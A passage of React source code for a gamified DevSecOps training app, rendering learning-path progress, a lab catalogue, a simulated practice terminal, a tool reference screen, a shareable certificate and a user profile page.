            const done = pathMods.filter(k => progress.modules?.[k]?.simulationComplete || (!MODULES[k].hasSim && progress.modules?.[k]?.quizBestScore >= 3)).length;
            const pct = pathMods.length ? Math.round((done / pathMods.length) * 100) : 0;
            const unlocked = p.id === 1 || p.id === 5 || (() => {
              const prereqMods = Object.keys(MODULES).filter(k => MODULES[k].pathId === p.id - 1);
              return prereqMods.every(k => {
                const mp = progress.modules?.[k];
                return mp?.simulationComplete || (!MODULES[k].hasSim && mp?.quizBestScore >= 3);
              });
            })();
            return (
              <div key={p.id} onClick={() => unlocked && onNavigate('paths', p.id)} className={`bg-[#18181B] border rounded-lg p-3 cursor-pointer transition-all ${unlocked ? 'border-[#27272A] hover:border-[#3B82F6]' : 'border-[#27272A] opacity-50 cursor-not-allowed'}`} style={unlocked ? { boxShadow: '0 1px 3px rgba(0,0,0,0.2)' } : {}}>
                <div className="flex items-center gap-2 mb-2">
                  <span className="text-lg">{p.icon}</span>
                  {!unlocked && <Lock size={12} className="text-[#71717A]" />}
                </div>
                <div className="text-[#FAFAFA] text-xs font-bold">{p.name}</div>
                <div className="text-[#71717A] text-[10px] mt-1">{done}/{pathMods.length} modules</div>
                <div className="w-full h-1 bg-[#27272A] rounded mt-2">
                  <div className="h-full bg-gradient-to-r from-[#3B82F6] to-[#A78BFA] rounded" style={{ width: `${pct}%` }} />
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {nextMod && (
        <div className="bg-[#18181B] border border-[#3B82F6] rounded-lg p-4 flex items-center justify-between" style={{ boxShadow: '0 2px 8px rgba(0,0,0,0.3)' }}>
          <div>
            <div className="text-[#71717A] text-xs uppercase">Recommended Next</div>
            <div className="text-[#3B82F6] text-sm font-bold mt-1">{MODULES[nextMod].id}: {MODULES[nextMod].title}</div>
            <div className="text-[#71717A] text-xs mt-1">Path {MODULES[nextMod].pathId} — {MODULES[nextMod].baseXP} XP</div>
          </div>
          <button onClick={() => onOpenModule(nextMod)} className="px-4 py-2 rounded border border-[#3B82F6] text-[#3B82F6] text-sm hover:bg-[rgba(59,130,246,0.1)] flex items-center gap-1">
            Start <ArrowRight size={14} />
          </button>
        </div>
      )}

      {Object.values(badges).some(b => b.unlocked) && (
        <div>
          <div className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">Badges</div>
          <div className="flex gap-2 flex-wrap">
            {Object.entries(badges).filter(([, b]) => b.unlocked).map(([id]) => {
              const badge = BADGES.find(b => b.id === id);
              return badge ? (
                <span key={id} className="px-2 py-1 rounded text-xs font-mono bg-[rgba(245,158,11,0.1)] text-[#F59E0B] border border-[rgba(245,158,11,0.15)]">{badge.icon} {badge.name}</span>
              ) : null;
            })}
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-[#18181B] border border-[#27272A] rounded-xl p-6">
          <div className="text-sm font-semibold uppercase tracking-wider mb-4" style={{ color: DT.textPrimary }}>Quick Start Guide</div>
          <div className="space-y-3">
            {[
              { step: '1', text: 'Start with Path 1: DevSecOps Fundamentals', done: completedMods > 0 },
              { step: '2', text: 'Complete all 6 modules to unlock Security Scanning', done: completedMods >= 6 },
              { step: '3', text: 'Master 10+ commands in the Terminal simulator', done: (terminal.masteredCommands || []).length >= 10 },
              { step: '4', text: 'Use the Intel tab as your cheat sheet', done: false },
              { step: '5', text: 'Try the Interview Prep path (always unlocked!)', done: false },
            ].map((item, i) => (
              <div key={i} className="flex items-center gap-3">
                <div className="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold shrink-0" style={{ background: item.done ? DT.successMuted : DT.surfaceRaised, color: item.done ? DT.success : DT.textTertiary, border: `1px solid ${item.done ? DT.success : DT.border}` }}>
                  {item.done ? '\u2713' : item.step}
                </div>
                <span className="text-sm" style={{ color: item.done ? DT.textTertiary : DT.textSecondary, textDecoration: item.done ? 'line-through' : 'none' }}>{item.text}</span>
              </div>
            ))}
          </div>
        </div>
        <div className="bg-[#18181B] border border-[#27272A] rounded-xl p-6">
          <div className="text-sm font-semibold uppercase tracking-wider mb-4" style={{ color: DT.textPrimary }}>Tools You'll Master</div>
          <div className="flex flex-wrap gap-2">
            {['Gitleaks', 'TruffleHog', 'Semgrep', 'Trivy', 'Grype', 'Hadolint', 'OWASP ZAP', 'Checkov', 'Vault', 'OPA', 'Jenkins', 'GitLab CI', 'GitHub Actions', 'Docker', 'kubectl', 'SonarQube'].map(tool => (
              <span key={tool} className="px-3 py-1.5 rounded-lg text-xs font-medium" style={{ background: DT.surfaceRaised, color: DT.textSecondary, border: `1px solid ${DT.border}` }}>{tool}</span>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ============================================================================
// SCREEN: PATHS
// ============================================================================
function PathsScreen({ progress, onOpenModule, focusPath }) {
  const [openPath, setOpenPath] = useState(focusPath || null);

  useEffect(() => { if (focusPath) setOpenPath(focusPath); }, [focusPath]);

  const isPathUnlocked = (pathId) => {
    if (pathId === 1 || pathId === 5) return true;
    const prereqId = pathId - 1;
    const prereqMods = Object.keys(MODULES).filter(k => MODULES[k].pathId === prereqId);
    return prereqMods.every(k => {
      const mp = progress.modules?.[k];
      return mp?.simulationComplete || (!MODULES[k].hasSim && mp?.quizBestScore >= 3);
    });
  };

  return (
    <div className="p-6 max-w-6xl mx-auto space-y-4">
      {PATHS.map(p => {
        const unlocked = isPathUnlocked(p.id);
        const pathMods = Object.keys(MODULES).filter(k => MODULES[k].pathId === p.id).sort();
        const done = pathMods.filter(k => progress.modules?.[k]?.simulationComplete || (!MODULES[k].hasSim && progress.modules?.[k]?.quizBestScore >= 3)).length;
        const pct = pathMods.length ? Math.round((done / pathMods.length) * 100) : 0;

        return (
          <div key={p.id} className={`bg-[#18181B] border rounded-lg overflow-hidden ${unlocked ? 'border-[#27272A]' : 'border-[#27272A] opacity-60'}`}>
            <button onClick={() => unlocked && setOpenPath(openPath === p.id ? null : p.id)} className="w-full flex items-center gap-4 p-4 text-left">
              <span className="text-2xl">{p.icon}</span>
              <div className="flex-1">
                <div className="flex items-center gap-2">
                  <span className="text-[#FAFAFA] font-semibold text-sm">{p.name}</span>
                  {!unlocked && <Lock size={14} className="text-[#71717A]" />}
                  <span className={`text-[10px] px-1.5 py-0.5 rounded font-mono ${p.difficulty === 'Beginner' ? 'bg-[rgba(59,130,246,0.1)] text-[#3B82F6]' : p.difficulty === 'Intermediate' ? 'bg-[rgba(167,139,250,0.1)] text-[#3B82F6]' : p.difficulty === 'Advanced' ? 'bg-[rgba(245,158,11,0.1)] text-[#F59E0B]' : 'bg-[rgba(167,139,250,0.1)] text-[#A78BFA]'}`}>{p.difficulty}</span>
                </div>
                <div className="text-[#71717A] text-xs mt-1">{p.desc}</div>
                <div className="flex items-center gap-2 mt-2">
                  <div className="flex-1 h-1 bg-[#27272A] rounded"><div className="h-full bg-gradient-to-r from-[#3B82F6] to-[#A78BFA] rounded" style={{ width: `${pct}%` }} /></div>
                  <span className="text-[#71717A] text-xs">{done}/{pathMods.length}</span>
                </div>
              </div>
              {unlocked && (openPath === p.id ? <ChevronDown size={16} className="text-[#71717A]" /> : <ChevronRight size={16} className="text-[#71717A]" />)}
            </button>
            {openPath === p.id && unlocked && (
              <div className="border-t border-[#27272A] divide-y divide-[#27272A]">
                {pathMods.map(mid => {
                  const mod = MODULES[mid];
                  const mp = progress.modules?.[mid] || {};
                  const isDone = mp.simulationComplete || (!mod.hasSim && mp.quizBestScore >= 3);
                  return (
                    <button key={mid} onClick={() => onOpenModule(mid)} className="w-full flex items-center gap-3 px-6 py-3 text-left hover:bg-[#27272A] transition-colors">
                      <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-mono ${isDone ? 'bg-[rgba(59,130,246,0.1)] text-[#3B82F6]' : 'bg-[#27272A] text-[#71717A]'}`}>
                        {isDone ? <Check size={12} /> : mod.id.split('.')[1]}
                      </div>
                      <div className="flex-1">
                        <div className={`text-sm ${isDone ? 'text-[#3B82F6]' : 'text-[#FAFAFA]'}`}>{mod.title}</div>
                        <div className="flex items-center gap-2 mt-0.5">
                          <span className="text-[#71717A] text-xs">{mod.baseXP} XP</span>
                          {mod.estTime && <span className="text-[#71717A] text-xs flex items-center gap-0.5"><Clock size={9} /> {mod.estTime}</span>}
                          {mod.hasSim && <span className="text-[10px] px-1 rounded bg-[rgba(167,139,250,0.1)] text-[#3B82F6]">Lab</span>}
                          {mp.notes && <StickyNote size={10} className="text-[#F59E0B]" />}
                        </div>
                      </div>
                      <div className="flex gap-1">
                        {mp.simulationComplete && <span className="text-[10px] text-[#3B82F6]">Sim✓</span>}
                        {mp.verified && <span className="text-[10px] text-[#3B82F6]">Ver✓</span>}
                        {mp.quizBestScore >= 3 && <span className="text-[10px] text-[#F59E0B]">Q{mp.quizBestScore}/5</span>}
                      </div>
                      <ChevronRight size={14} className="text-[#71717A]" />
                    </button>
                  );
                })}
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ============================================================================
// SCREEN: LABS
// ============================================================================
function LabsScreen({ progress, onOpenModule }) {
  const [diffFilter, setDiffFilter] = useState(null);
  const [catFilter, setCatFilter] = useState(null);
  const diffs = ['beginner', 'intermediate', 'advanced'];
  const cats = [...new Set(LABS_LIST.map(l => l.category))];

  const filtered = LABS_LIST.filter(l => {
    if (diffFilter && l.difficulty !== diffFilter) return false;
    if (catFilter && l.category !== catFilter) return false;
    return true;
  });

  return (
    <div className="p-6 max-w-full">
      <div className="flex flex-wrap gap-2 mb-4">
        {diffs.map(d => (
          <button key={d} onClick={() => setDiffFilter(diffFilter === d ? null : d)} className={`px-3 py-1 rounded text-xs border ${diffFilter === d ? (d === 'beginner' ? 'border-[#3B82F6] text-[#3B82F6] bg-[rgba(59,130,246,0.1)]' : d === 'intermediate' ? 'border-[#3B82F6] text-[#3B82F6] bg-[rgba(167,139,250,0.1)]' : 'border-[#F59E0B] text-[#F59E0B] bg-[rgba(245,158,11,0.1)]') : 'border-[#27272A] text-[#71717A] hover:border-[#3F3F46]'}`}>
            {d}
          </button>
        ))}
        <span className="mx-2 text-[#27272A]">|</span>
        {cats.map(c => (
          <button key={c} onClick={() => setCatFilter(catFilter === c ? null : c)} className={`px-3 py-1 rounded text-xs border ${catFilter === c ? 'border-[#3B82F6] text-[#3B82F6] bg-[rgba(167,139,250,0.1)]' : 'border-[#27272A] text-[#71717A] hover:border-[#3F3F46]'}`}>
            {c}
          </button>
        ))}
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
        {filtered.map(lab => {
          const mp = progress.modules?.[lab.moduleId] || {};
          const done = mp.simulationComplete;
          return (
            <button key={lab.id} onClick={() => onOpenModule(lab.moduleId)} className={`group bg-[#18181B] border rounded-lg p-4 text-left transition-all hover:border-[#3B82F6] ${done ? 'border-[#3B82F6]' : 'border-[#27272A]'}`} style={{ boxShadow: done ? '0 2px 8px rgba(0,0,0,0.2)' : 'none' }}>
              <div className="flex items-center justify-between mb-2">
                <span className={`text-[10px] px-1.5 py-0.5 rounded font-mono ${lab.difficulty === 'beginner' ? 'bg-[rgba(59,130,246,0.1)] text-[#3B82F6]' : lab.difficulty === 'intermediate' ? 'bg-[rgba(167,139,250,0.1)] text-[#3B82F6]' : 'bg-[rgba(245,158,11,0.1)] text-[#F59E0B]'}`}>{lab.difficulty}</span>
                {done && <CheckCircle size={14} className="text-[#3B82F6]" />}
              </div>
              <div className="text-[#FAFAFA] text-sm font-bold mb-1">{lab.title}</div>
              <div className="flex flex-wrap gap-1 mb-2">
                {lab.tools.map(t => <span key={t} className="text-[10px] px-1.5 py-0.5 rounded bg-[#27272A] text-[#71717A] font-mono">{t}</span>)}
              </div>
              <div className="flex items-center justify-between mt-2">
                <div className="flex items-center gap-2 text-[#71717A] text-xs">
                  <Clock size={10} /> {lab.time}
                </div>
                <span className="text-xs font-medium opacity-0 group-hover:opacity-100 transition-opacity" style={{ color: DT.blue }}>{`Start \u2192`}</span>
              </div>
            </button>
          );
        })}
      </div>
    </div>
  );
}

// ============================================================================
// SCREEN: TERMINAL
// ============================================================================
function TerminalScreen({ profile, terminal, onMasterCommand, onCompleteChallenge }) {
  const [mode, setMode] = useState('free');
  const [input, setInput] = useState('');
  const [history, setHistory] = useState([{ type: 'system', text: 'SecOps Academy Terminal v1.0\nType "help" for available commands.\n' }]);
  const [currentChallenge, setCurrentChallenge] = useState(0);
  const inputRef = useRef(null);
  const endRef = useRef(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [history]);
  useEffect(() => { inputRef.current?.focus(); }, [mode]);

  const mastered = terminal.masteredCommands || [];
  const challengesDone = terminal.challengesCompleted || [];

  const handleFreeCommand = () => {
    const trimmed = input.trim();
    if (!trimmed) return;
    setInput('');
    if (trimmed === 'clear') {
      setHistory([]);
      return;
    }
    const newHist = [...history, { type: 'input', text: trimmed }];
    if (trimmed === 'whoami') {
      const rank = getRank(profile.totalXP);
      newHist.push({ type: 'output', text: `Callsign: ${profile.callsign || 'Not set'}\nRank: ${rank.icon} ${rank.name}\nXP: ${profile.totalXP}\nStreak: ${profile.streak} days` });
    } else if (TERMINAL_COMMANDS[trimmed]) {
      newHist.push({ type: 'output', text: TERMINAL_COMMANDS[trimmed] });
      const META_COMMANDS = ['help', 'clear', 'whoami'];
      if (!mastered.includes(trimmed) && !META_COMMANDS.includes(trimmed)) onMasterCommand(trimmed);
    } else {
      newHist.push({ type: 'error', text: 'Command not recognized. Type "help" for available commands.' });
    }
    setHistory(newHist);
  };

  const challenge = TERMINAL_CHALLENGES[currentChallenge];

  const handleChallengeCommand = () => {
    const trimmed = input.trim();
    if (!trimmed || !challenge) return;
    setInput('');
    const newHist = [...history, { type: 'input', text: trimmed }];
    if (trimmed.toLowerCase().replace(/\s+/g, ' ') === challenge.answer.toLowerCase().replace(/\s+/g, ' ')) {
      newHist.push({ type: 'success', text: `✅ Correct! +30 XP\n${challenge.explanation}` });
      if (TERMINAL_COMMANDS[challenge.answer]) newHist.push({ type: 'output', text: TERMINAL_COMMANDS[challenge.answer] });
      if (!challengesDone.includes(challenge.id)) onCompleteChallenge(challenge.id);
      setHistory(newHist);
      if (currentChallenge + 1 < TERMINAL_CHALLENGES.length) {
        setTimeout(() => setCurrentChallenge(c => c + 1), 1000);
      }
    } else {
      newHist.push({ type: 'error', text: `❌ Not quite. Hint: ${challenge.hint}` });
      setHistory(newHist);
    }
  };

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center gap-3 px-4 py-2 bg-[#18181B] border-b border-[#27272A]">
        <button onClick={() => { setMode('free'); setHistory([{ type: 'system', text: 'Free practice mode. Type any command.' }]); }} className={`px-3 py-1 rounded text-xs border ${mode === 'free' ? 'border-[#3B82F6] text-[#3B82F6]' : 'border-[#27272A] text-[#71717A]'}`}>Free Practice</button>
        <button onClick={() => { setMode('challenge'); setHistory([{ type: 'system', text: 'Challenge mode. Complete objectives to earn XP.' }]); setCurrentChallenge(0); }} className={`px-3 py-1 rounded text-xs border ${mode === 'challenge' ? 'border-[#3B82F6] text-[#3B82F6]' : 'border-[#27272A] text-[#71717A]'}`}>Challenges</button>
        <span className="ml-auto text-[#71717A] text-xs">Commands mastered: {mastered.length}/{Object.keys(TERMINAL_COMMANDS).length - 3}</span>
      </div>
      {mode === 'challenge' && challenge && (
        <div className="px-4 py-2 bg-[rgba(245,158,11,0.05)] border-b border-[#27272A] flex items-center justify-between">
          <div>
            <span className="text-[#F59E0B] text-xs">Challenge {currentChallenge + 1}/{TERMINAL_CHALLENGES.length}: {challenge.objective}</span>
            {challengesDone.includes(challenge.id) && <span className="text-[#3B82F6] text-xs ml-2">✓ Completed</span>}
          </div>
          <button onClick={() => setHistory(h => [...h, { type: 'system', text: `Hint: ${challenge.hint}` }])} className="text-xs px-2 py-1 rounded border border-[#27272A] text-[#F59E0B] hover:border-[#F59E0B] font-mono">Hint</button>
        </div>
      )}
      <div className="flex-1 bg-[#0C0C0C] p-4 overflow-y-auto text-sm font-mono cursor-text" onClick={() => inputRef.current?.focus()}>
        {history.map((entry, i) => (
          <div key={i} className={`mb-1 ${entry.type === 'input' ? 'text-[#4ADE80]' : entry.type === 'error' ? 'text-[#EF4444]' : entry.type === 'success' ? 'text-[#22C55E]' : entry.type === 'system' ? 'text-[#3B82F6]' : 'text-[#D4D4D8]'}`}>
            {entry.type === 'input' && <span className="text-[#3B82F6]">secops&gt; </span>}
            <span className="whitespace-pre-wrap">{entry.text}</span>
          </div>
        ))}
        <div className="flex items-center">
          <span className="text-[#3B82F6]">secops&gt; </span>
          <input
            ref={inputRef}
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => {
              if (e.key === 'Enter') { mode === 'free' ? handleFreeCommand() : handleChallengeCommand(); }
              if (e.key === 'Tab') {
                e.preventDefault();
                const curr = input.trim().toLowerCase();
                if (!curr) return;
                const allCmds = Object.keys(TERMINAL_COMMANDS).filter(c => c !== 'help' && c !== 'whoami' && c !== 'clear');
                const matches = allCmds.filter(c => c.toLowerCase().startsWith(curr));
                if (matches.length === 1) {
                  setInput(matches[0]);
                } else if (matches.length > 1) {
                  setHistory(h => [...h, { type: 'system', text: matches.join('  ') }]);
                }
              }
            }}
            className="flex-1 bg-transparent text-[#4ADE80] outline-none text-sm font-mono"
            autoFocus
          />
        </div>
        <div ref={endRef} />
      </div>
    </div>
  );
}

// ============================================================================
// SCREEN: INTEL
// ============================================================================
function IntelScreen() {
  const [search, setSearch] = useState('');
  const [openSection, setOpenSection] = useState(null);
  const s = search.toLowerCase();

  const filteredTools = INTEL_TOOLS.map((t, i) => ({ ...t, origIdx: i })).filter(t => !s || t.name.toLowerCase().includes(s) || t.tools.toLowerCase().includes(s) || t.commands.some(c => c.cmd.toLowerCase().includes(s) || c.desc.toLowerCase().includes(s)));

  // Auto-expand all sections when searching
  const effectiveOpen = s ? 'all' : openSection;

  return (
    <div className="p-6 max-w-6xl mx-auto space-y-6">
      <div className="flex gap-3 items-center">
        <div className="relative flex-1">
          <Search size={16} className="absolute left-3 top-2.5 text-[#71717A]" />
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search tools, commands, frameworks..." className="w-full bg-[#18181B] border border-[#27272A] rounded-lg pl-10 pr-4 py-2 text-[#FAFAFA] text-sm focus:border-[#3B82F6] outline-none no-print" />
        </div>
        <button onClick={() => window.print()} className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-medium border no-print" style={{ borderColor: DT.border, color: DT.textSecondary, background: DT.surface }}>
          <Printer size={14} /> Print Cheat Sheet
        </button>
      </div>

      <div className="flex gap-2 flex-wrap no-print">
        {[
          { label: 'Tools', id: 'tools' },
          { label: 'SAST vs DAST', id: 'compare-sast' },
          { label: 'CI/CD Platforms', id: 'compare-cicd' },
          { label: 'Frameworks', id: 'frameworks' },
          { label: 'Interview Prep', id: 'interview' },
        ].map(link => (
          <button key={link.id} onClick={() => document.getElementById(link.id)?.scrollIntoView({ behavior: 'smooth', block: 'start' })} className="px-3 py-1.5 rounded-lg text-xs font-medium transition-colors hover:opacity-80" style={{ background: DT.surfaceRaised, color: DT.textSecondary, border: `1px solid ${DT.border}` }}>
            {link.label}
          </button>
        ))}
      </div>

      <div>
        <div id="tools" className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">Tool Quick Reference</div>
        <div className="space-y-2">
          {filteredTools.map((t, i) => {
            const isOpen = effectiveOpen === 'all' || openSection === t.origIdx;
            return (
            <div key={t.origIdx} className="bg-[#18181B] border border-[#27272A] rounded-lg overflow-hidden">
              <button onClick={() => setOpenSection(openSection === t.origIdx ? null : t.origIdx)} className="w-full flex items-center gap-3 px-4 py-3 text-left">
                <div className="flex-1">
                  <span className="text-[#3B82F6] text-sm font-bold">{t.name}</span>
                  <span className="text-[#71717A] text-xs ml-2">{t.tools}</span>
                </div>
                {isOpen ? <ChevronDown size={14} className="text-[#71717A]" /> : <ChevronRight size={14} className="text-[#71717A]" />}
              </button>
              {isOpen && (
                <div className="border-t border-[#27272A] divide-y divide-[#27272A]">
                  {t.commands.map((c, j) => (
                    <div key={j} className="px-4 py-2 flex items-center gap-2">
                      <code className="text-[#3B82F6] text-xs flex-1">{c.cmd}</code>
                      <span className="text-[#71717A] text-xs shrink-0 max-w-[200px] truncate">{c.desc}</span>
                      <CopyButton text={c.cmd} />
                    </div>
                  ))}
                </div>
              )}
            </div>
            );
          })}
        </div>
      </div>

      <div>
        <div id="compare-sast" className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">SAST vs DAST vs SCA vs IAST</div>
        <div className="overflow-x-auto">
          <table className="w-full text-xs font-mono">
            <thead><tr>{INTEL_COMPARISON_SAST.headers.map((h, i) => <th key={i} className="text-left px-3 py-2 text-[#3B82F6] border-b border-[#27272A]">{h}</th>)}</tr></thead>
            <tbody>{INTEL_COMPARISON_SAST.rows.map((row, i) => <tr key={i} className="border-b border-[#27272A]">{row.map((cell, j) => <td key={j} className={`px-3 py-2 ${j === 0 ? 'text-[#3B82F6] font-bold' : 'text-[#FAFAFA]'}`}>{cell}</td>)}</tr>)}</tbody>
          </table>
        </div>
      </div>

      <div>
        <div id="compare-cicd" className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">CI/CD Platform Comparison</div>
        <div className="overflow-x-auto">
          <table className="w-full text-xs font-mono">
            <thead><tr>{INTEL_COMPARISON_CICD.headers.map((h, i) => <th key={i} className="text-left px-3 py-2 text-[#3B82F6] border-b border-[#27272A]">{h}</th>)}</tr></thead>
            <tbody>{INTEL_COMPARISON_CICD.rows.map((row, i) => <tr key={i} className="border-b border-[#27272A]">{row.map((cell, j) => <td key={j} className={`px-3 py-2 ${j === 0 ? 'text-[#3B82F6] font-bold' : 'text-[#FAFAFA]'}`}>{cell}</td>)}</tr>)}</tbody>
          </table>
        </div>
      </div>

      <div>
        <div id="frameworks" className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">Frameworks Reference</div>
        <div className="space-y-2">
          {INTEL_FRAMEWORKS.filter(f => !s || f.name.toLowerCase().includes(s) || f.desc.toLowerCase().includes(s)).map((f, i) => (
            <div key={i} className="bg-[#18181B] border border-[#27272A] rounded-lg px-4 py-3">
              <div className="text-[#3B82F6] text-sm font-bold">{f.name}</div>
              <div className="text-[#FAFAFA] text-xs mt-1">{f.desc}</div>
            </div>
          ))}
        </div>
      </div>

      <div>
        <div id="interview" className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-3">Interview Quick Reference</div>
        <div className="bg-[#18181B] border border-[#F59E0B] rounded-lg p-4 mb-4" style={{ boxShadow: '0 2px 8px rgba(0,0,0,0.2)' }}>
          <div className="text-[#F59E0B] text-xs uppercase tracking-wider mb-1">Your Unique Angle</div>
          <div className="text-[#FAFAFA] text-xs italic">"I approach DevSecOps from an attacker's perspective. I know what adversaries look for — exposed secrets, vulnerable dependencies, misconfigured infrastructure — because I've studied and tested for these. My pipelines are designed to catch what I would target as an attacker."</div>
        </div>
        <div className="space-y-1">
          {INTEL_INTERVIEW_QUICK.filter(q => !s || q.q.toLowerCase().includes(s) || q.a.toLowerCase().includes(s)).map((q, i) => (
            <div key={i} className="bg-[#18181B] border border-[#27272A] rounded px-4 py-2 flex gap-4">
              <div className="text-[#3B82F6] text-xs font-bold shrink-0 w-48">{q.q}</div>
              <div className="text-[#FAFAFA] text-xs">{q.a}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ============================================================================
// SCREEN: PROFILE
// ============================================================================
function CertificateModal({ profile, progress, rank, onClose }) {
  const completedMods = Object.values(progress.modules || {}).filter(m => m.simulationComplete || m.quizBestScore >= 3).length;
  const [copied, setCopied] = useState(false);
  const shareText = `I'm a ${rank.name} on SecOps Academy with ${profile.totalXP} XP! Completed ${completedMods} modules in DevSecOps. Free platform: https://secops.academy #DevSecOps #CyberSecurity`;
  const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(shareText)}`;
  const linkedInUrl = `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent('https://secops.academy')}&summary=${encodeURIComponent(shareText)}`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center" style={{ background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(8px)' }}>
      <div className="w-full max-w-lg mx-4 rounded-xl overflow-hidden" style={{ background: DT.surface, border: `1px solid ${DT.border}` }}>
        <div className="p-8 text-center" style={{ background: `linear-gradient(135deg, ${DT.bg}, ${DT.surface})`, borderBottom: `2px solid ${DT.blue}` }}>
          <div className="text-xs uppercase tracking-widest mb-2" style={{ color: DT.blue }}>SecOps Academy</div>
          <div className="text-2xl font-bold mb-1" style={{ color: DT.textPrimary }}>Certificate of Completion</div>
          <div className="w-16 h-0.5 mx-auto my-4" style={{ background: DT.blue }} />
          <div className="text-3xl font-bold mb-2" style={{ color: DT.blue }}>{profile.callsign || 'Operator'}</div>
          <div className="text-sm mb-1" style={{ color: DT.textSecondary }}>{rank.icon} {rank.name}</div>
          <div className="text-xs mt-4" style={{ color: DT.textTertiary }}>
            {completedMods} Modules Completed | {profile.totalXP.toLocaleString()} XP Earned
          </div>
          <div className="text-xs mt-2" style={{ color: DT.textTertiary }}>{new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</div>
          <div className="text-[10px] mt-4 uppercase tracking-wider" style={{ color: DT.textTertiary }}>Fractal AI Security Team</div>
        </div>
        <div className="p-4 flex flex-wrap gap-2 justify-center">
          <button onClick={() => { navigator.clipboard.writeText(shareText); setCopied(true); setTimeout(() => setCopied(false), 2000); }} className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-medium border" style={{ borderColor: DT.blue, color: DT.blue }}>
            {copied ? <Check size={14} /> : <Copy size={14} />} {copied ? 'Copied!' : 'Copy Share Text'}
          </button>
          <a href={twitterUrl} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-medium border" style={{ borderColor: DT.border, color: DT.textSecondary }}>
            <Share2 size={14} /> Share on X
          </a>
          <a href={linkedInUrl} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-medium border" style={{ borderColor: DT.border, color: DT.textSecondary }}>
            <Share2 size={14} /> Share on LinkedIn
          </a>
          <button onClick={onClose} className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-medium border" style={{ borderColor: DT.border, color: DT.textTertiary }}>
            Close
          </button>
        </div>
      </div>
    </div>
  );
}

function ProfileScreen({ profile, progress, badges, terminal, onUpdateProfile, onReset }) {
  const [callsign, setCallsign] = useState(profile.callsign || '');
  const [showReset, setShowReset] = useState(false);
  const [resetConfirm, setResetConfirm] = useState('');
  const [showCert, setShowCert] = useState(false);
  const rank = getRank(profile.totalXP);
  const nextRank = getNextRank(profile.totalXP);

  const totalMods = Object.keys(MODULES).length;
  const completedMods = Object.values(progress.modules || {}).filter(m => m.simulationComplete || m.quizBestScore >= 3).length;
  const verifiedLabs = Object.values(progress.modules || {}).filter(m => m.verified).length;
  const quizzesPassed = Object.values(progress.modules || {}).filter(m => m.quizBestScore >= 3).length;
  const perfectQuizzes = Object.values(progress.modules || {}).filter(m => m.quizBestScore === 5).length;
  const masteredCmds = (terminal.masteredCommands || []).length;
  const challengesDone = (terminal.challengesCompleted || []).length;

  const handleSaveCallsign = () => {
    if (callsign.trim() && callsign.trim().length <= 20 && !/\s/.test(callsign.trim())) {
      onUpdateProfile({ callsign: callsign.trim() });
    }
  };

  return (
    <div className="p-6 max-w-5xl mx-auto space-y-6">
      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6">
        <div className="text-[#71717A] text-xs uppercase tracking-wider mb-2">Callsign</div>
        <div className="flex items-center gap-2">
          <input value={callsign} onChange={e => setCallsign(e.target.value.replace(/\s/g, ''))} maxLength={20} className="bg-[#09090B] border border-[#27272A] rounded px-3 py-2 text-[#3B82F6] text-lg focus:border-[#3B82F6] outline-none w-64" placeholder="Enter callsign..." />
          <button onClick={handleSaveCallsign} className="px-3 py-2 rounded border border-[#3B82F6] text-[#3B82F6] text-sm hover:bg-[rgba(59,130,246,0.1)]">Save</button>
        </div>
      </div>

      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6 text-center">
        <div className="text-5xl mb-2">{rank.icon}</div>
        <div className="text-[#3B82F6] text-xl font-bold">{rank.name}</div>
        <div className="text-[#71717A] text-sm mt-1">{rank.tagline}</div>
        <div className="text-[#3B82F6] text-lg mt-2">{profile.totalXP.toLocaleString()} XP</div>
        {nextRank && (
          <div className="mt-3">
            <div className="w-64 h-2 bg-[#27272A] rounded mx-auto">
              <div className="h-full bg-gradient-to-r from-[#3B82F6] to-[#A78BFA] rounded" style={{ width: `${((profile.totalXP - rank.minXP) / (nextRank.minXP - rank.minXP)) * 100}%` }} />
            </div>
            <div className="text-[#71717A] text-xs mt-1">{nextRank.minXP - profile.totalXP} XP to {nextRank.name}</div>
          </div>
        )}
      </div>

      <div className="bg-[#18181B] border border-[#27272A] rounded-lg p-6">
        <div className="text-[#3B82F6] text-sm font-bold uppercase tracking-wider mb-4">Stats</div>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {[
            { label: 'Modules', value: `${completedMods}/${totalMods}` },
            { label: 'Labs Verified', value: verifiedLabs },
            { label: 'Quizzes Passed', value: quizzesPassed },
            { label: 'Perfect Quizzes', value: perfectQuizzes },
            { label: 'Commands Mastered', value: masteredCmds },
            { label: 'Challenges Done', value: challengesDone },
            { label: 'Current Streak', value: `${profile.streak} days` },
            { label: 'Longest Streak', value: `${profile.longestStreak} days` },
          ].map((s, i) => (
            <div key={i}>
              <div className="text-[#71717A] text-xs">{s.label}</div>
